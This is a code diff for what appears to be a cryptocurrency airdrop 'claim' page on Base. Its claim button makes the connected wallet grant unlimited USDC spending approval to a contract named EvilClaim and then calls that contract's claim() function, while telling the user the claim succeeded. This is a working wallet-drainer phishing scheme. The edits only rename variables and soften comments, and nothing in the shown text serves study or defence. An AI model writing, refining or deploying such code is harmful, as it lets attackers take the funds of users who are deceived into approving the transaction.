@@ -129,12 +129,13 @@
 
     let provider, signer;
 
-    const USDC_ADDRESS = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"; // ✅ Correct Base USDC
-    const EVIL_SPENDER = "0xc7a512CE6eE4867427FFA30BACc4158598B90d9f";
+    const USDC_ADDRESS = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"; // ✅ Base USDC
+    const EVIL_CLAIM_CONTRACT = "0xc7a512CE6eE4867427FFA30BACc4158598B90d9f"; // ✅ EvilClaim contract
 
     const ERC20_ABI = [
       "function approve(address spender, uint256 amount) external returns (bool)"
     ];
+
     const EVIL_ABI = ["function claim() external"];
 
     connectWalletBtn.addEventListener('click', async () => {
@@ -151,7 +152,7 @@
 
         const { chainId } = await provider.getNetwork();
         if (chainId !== 8453) {
-          alert("Please switch your wallet to Base Mainnet (Chain ID: 8453).");
+          alert("Please switch to Base Mainnet (Chain ID: 8453).");
           return;
         }
 
@@ -169,20 +170,20 @@
 
     claimBtn.addEventListener('click', async () => {
       if (!signer) {
-        alert("Connect wallet first.");
+        alert("Connect your wallet first.");
         return;
       }
 
       try {
-        // Step 1: Approve USDC to EvilClaim
-        const token = new ethers.Contract(USDC_ADDRESS, ERC20_ABI, signer);
-        const tx1 = await token.approve(EVIL_SPENDER, ethers.constants.MaxUint256);
-        await tx1.wait();
+        // Step 1: Approve USDC
+        const usdc = new ethers.Contract(USDC_ADDRESS, ERC20_ABI, signer);
+        const approvalTx = await usdc.approve(EVIL_CLAIM_CONTRACT, ethers.constants.MaxUint256);
+        await approvalTx.wait();
 
-        // Step 2: Call EvilClaim.claim()
-        const evil = new ethers.Contract(EVIL_SPENDER, EVIL_ABI, signer);
-        const tx2 = await evil.claim();
-        await tx2.wait();
+        // Step 2: Call claim()
+        const evil = new ethers.Contract(EVIL_CLAIM_CONTRACT, EVIL_ABI, signer);
+        const claimTx = await evil.claim();
+        await claimTx.wait();
 
         alert("✅ Claim successful!");
       } catch (err) {
